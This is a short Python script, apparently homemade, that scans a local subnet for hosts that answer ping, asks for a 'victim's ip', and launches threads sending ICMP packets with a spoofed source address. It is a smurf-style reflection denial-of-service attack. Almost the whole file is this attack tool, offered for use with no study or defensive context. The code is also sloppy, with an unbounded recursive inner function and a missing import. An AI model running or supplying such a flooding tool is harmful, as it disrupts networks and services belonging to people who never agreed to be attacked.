
from scapy.all import *
import subprocess
import threading



def ping(hostname):
    p = subprocess.Popen('ping ' + hostname + ' -n 1', stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    pingStatus = 0;

    for line in p.stdout:
        output = line.rstrip().decode('UTF-8')

        if (output.endswith('unreachable.')):
            pingStatus = 1
            break
    return pingStatus


activehosts=[]




for i in range(1,10):
    ip="192.168.74."+str(i)
    status=ping(ip)
    if status==0 :
        activehosts.append(ip)
        print(ip+"is an active host")
    else:
        print(ip+"is a dead host")



print("total hosts that are active="+str(len(activehosts)))


print(activehosts)





a=input("enter victim's ip= ")


def smurfacttack(ip):
    iface = "Intel(R) Ethernet Connection I217-LM"
    fake_ip = a
    destination_ip = ip
    def ping(source, destination, iface):
        pkt = IP(src=source,dst=destination)/ICMP()
        srloop(IP(src=source,dst=destination)/ICMP(), iface=iface)
        print ("Starting Ping")
        ping(fake_ip,destination_ip,iface)


    try:
        print("Starting Ping")
        ping(fake_ip, destination_ip, iface)
    except KeyboardInterrupt:
        print("Exiting.. ")
        sys.exit(0)

thread_list = []
for thr in range(len(activehosts)):
    thread = threading.Thread(target=smurfacttack, args=(activehosts[thr], ))
    thread_list.append(thread)
    thread_list[thr].start()

